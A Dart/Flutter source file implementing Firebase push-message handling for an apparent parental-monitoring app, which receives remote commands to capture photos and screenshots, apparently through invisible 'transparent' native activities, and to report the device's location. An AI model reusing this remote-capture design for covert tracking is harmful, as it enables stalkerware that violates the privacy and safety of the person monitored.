// lib/services/fcm/fcm_handler.dart - COMPLETE FCM IMPLEMENTATION
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:get/get.dart';
import 'dart:developer' as developer;
import '../local/local_storage_service.dart';
import '../api/device_service.dart';
import '../background/location_service.dart';

/// Background message handler (must be top-level function)
@pragma('vm:entry-point')
Future<void> firebaseMessagingBackgroundHandler(RemoteMessage message) async {
  developer.log('========================================', name: 'FCM');
  developer.log('📨 Background FCM Message Received', name: 'FCM');
  developer.log('Message ID: ${message.messageId}', name: 'FCM');
  developer.log('Data: ${message.data}', name: 'FCM');

  await LocalStorageService.init();

  await FcmHandler.handleCommand(message.data);

  developer.log('========================================', name: 'FCM');
}

class FcmHandler {
  static const String _tag = 'FcmHandler';
  static final FirebaseMessaging _messaging = FirebaseMessaging.instance;

  /// Initialize FCM
  static Future<void> initialize() async {
    developer.log('========================================', name: _tag);
    developer.log('🚀 INITIALIZING FCM', name: _tag);

    try {
      // Step 1: Request permission
      developer.log('Requesting FCM permission...', name: _tag);
      NotificationSettings settings = await _messaging.requestPermission(
        alert: true,
        badge: true,
        sound: true,
        provisional: false,
      );

      developer.log(
        'Permission status: ${settings.authorizationStatus}',
        name: _tag,
      );

      if (settings.authorizationStatus == AuthorizationStatus.authorized) {
        developer.log('✅ FCM Permission granted', name: _tag);
      } else if (settings.authorizationStatus ==
          AuthorizationStatus.provisional) {
        developer.log('⚠️ FCM Provisional permission granted', name: _tag);
      } else {
        developer.log('❌ FCM Permission denied', name: _tag);
        return;
      }

      // Step 2: Get FCM token
      String? token = await _messaging.getToken();

      if (token != null) {
        developer.log(
          '✅ FCM Token received: ${token.substring(0, 20)}...',
          name: _tag,
        );
        await _saveFcmToken(token);
        await _sendTokenToServer(token);
      } else {
        developer.log('❌ Failed to get FCM token', name: _tag);
      }

      // Step 3: Setup message handlers
      _setupMessageHandlers();

      // Step 4: Listen for token refresh
      _messaging.onTokenRefresh.listen((newToken) {
        developer.log(
          '🔄 FCM Token refreshed: ${newToken.substring(0, 20)}...',
          name: _tag,
        );
        _saveFcmToken(newToken);
        _sendTokenToServer(newToken);
      });

      developer.log('✅ FCM Initialization complete', name: _tag);
    } catch (e, stackTrace) {
      developer.log(
        '❌ FCM Initialization failed',
        name: _tag,
        error: e,
        stackTrace: stackTrace,
        level: 1000,
      );
    }

    developer.log('========================================', name: _tag);
  }

  /// Setup foreground and background message handlers
  static void _setupMessageHandlers() {
    developer.log('Setting up message handlers...', name: _tag);

    // Foreground messages
    FirebaseMessaging.onMessage.listen((RemoteMessage message) {
      developer.log('========================================', name: _tag);
      developer.log('📨 Foreground FCM Message', name: _tag);
      developer.log('Message ID: ${message.messageId}', name: _tag);

      if (message.notification != null) {
        developer.log('Title: ${message.notification!.title}', name: _tag);
        developer.log('Body: ${message.notification!.body}', name: _tag);
      }

      if (message.data.isNotEmpty) {
        developer.log('Data: ${message.data}', name: _tag);
        handleCommand(message.data);
      }

      developer.log('========================================', name: _tag);
    });

    // Background/terminated messages handler registered in main.dart
    developer.log('✅ Message handlers configured', name: _tag);
  }

  /// Handle command from parent
  static Future<void> handleCommand(Map<String, dynamic> data) async {
    if (data.isEmpty) {
      developer.log('⚠️ Empty command data', name: _tag);
      return;
    }

    final commandType = data['type']?.toString();

    if (commandType == null) {
      developer.log('⚠️ No command type in data', name: _tag);
      return;
    }

    developer.log('========================================', name: _tag);
    developer.log('🎯 PROCESSING COMMAND: $commandType', name: _tag);
    developer.log('Full data: $data', name: _tag);

    try {
      switch (commandType) {
        case 'CAPTURE_PHOTO':
          // ✅ NATIVE HANDLES THIS - Don't use Flutter CameraService
          developer.log('📸 Command: Capture Photo', name: _tag);
          developer.log(
            '✅ Handled by native FCM service (CameraTransparentActivity)',
            name: _tag,
          );
          break;

        case 'SCREEN_CAPTURE':
          // ✅ NATIVE HANDLES THIS - Don't use Flutter ScreenCaptureService
          developer.log('🖥️ Command: Capture Screenshot', name: _tag);
          developer.log(
            '✅ Handled by native FCM service (ScreenCaptureTransparentActivity)',
            name: _tag,
          );
          break;

        case 'REQUEST_LOCATION':
          developer.log('📍 Executing: Request Location', name: _tag);
          await LocationService.sendImmediateLocation();
          developer.log('✅ Location sent', name: _tag);
          break;

        case 'START_MONITORING':
          developer.log('▶️ Executing: Start Monitoring', name: _tag);
          developer.log('✅ Monitoring already active', name: _tag);
          break;

        case 'STOP_MONITORING':
          developer.log('⏹️ Executing: Stop Monitoring', name: _tag);
          developer.log(
            '⚠️ Stop monitoring not implemented (services continue)',
            name: _tag,
          );
          break;

        case 'START_SCREEN_MONITOR':
          developer.log('🖥️ Command: Start Screen Monitor', name: _tag);
          developer.log(
            '⚠️ Screen monitoring not implemented (no backend support)',
            name: _tag,
          );
          break;

        case 'STOP_SCREEN_MONITOR':
          developer.log('🖥️ Command: Stop Screen Monitor', name: _tag);
          developer.log(
            '⚠️ Screen monitoring not implemented (no backend support)',
            name: _tag,
          );
          break;

        default:
          developer.log(
            '⚠️ Unknown command type: $commandType',
            name: _tag,
            level: 900,
          );
      }
    } catch (e, stackTrace) {
      developer.log(
        '❌ Error executing command: $commandType',
        name: _tag,
        error: e,
        stackTrace: stackTrace,
        level: 1000,
      );
    }

    developer.log('========================================', name: _tag);
  }

  /// Save FCM token to local storage
  static Future<void> _saveFcmToken(String token) async {
    try {
      await LocalStorageService.saveFcmToken(token);
      developer.log('✅ FCM token saved to local storage', name: _tag);
    } catch (e) {
      developer.log('❌ Failed to save FCM token locally', name: _tag, error: e);
    }
  }

  /// Send FCM token to backend
  static Future<void> _sendTokenToServer(String token) async {
    try {
      final deviceId = await LocalStorageService.getDeviceId();

      if (deviceId == null || deviceId.isEmpty) {
        developer.log(
          '⚠️ No device ID, cannot send token to server',
          name: _tag,
        );
        return;
      }

      developer.log('Sending FCM token to server...', name: _tag);

      // Use DeviceService to send token
      if (Get.isRegistered<DeviceService>()) {
        final deviceService = Get.find<DeviceService>();
        await deviceService.updateFcmToken(token);
        developer.log('✅ FCM token sent to server successfully', name: _tag);
      } else {
        developer.log('⚠️ DeviceService not registered yet', name: _tag);
        // Will be sent later when service is available
      }
    } catch (e, stackTrace) {
      developer.log(
        '❌ Failed to send FCM token to server',
        name: _tag,
        error: e,
        stackTrace: stackTrace,
        level: 900,
      );
    }
  }

  /// Manually refresh token and send to server
  static Future<void> refreshToken() async {
    try {
      developer.log('Refreshing FCM token...', name: _tag);

      // Delete current token
      await _messaging.deleteToken();

      // Get new token
      String? newToken = await _messaging.getToken();

      if (newToken != null) {
        developer.log(
          '✅ New token: ${newToken.substring(0, 20)}...',
          name: _tag,
        );
        await _saveFcmToken(newToken);
        await _sendTokenToServer(newToken);
      }
    } catch (e) {
      developer.log('❌ Failed to refresh token', name: _tag, error: e);
    }
  }

  /// Check if FCM token exists
  static Future<bool> hasToken() async {
    final token = await LocalStorageService.getFcmToken();
    return token != null && token.isNotEmpty;
  }

  /// Get current FCM token
  static Future<String?> getToken() async {
    return await _messaging.getToken();
  }
}
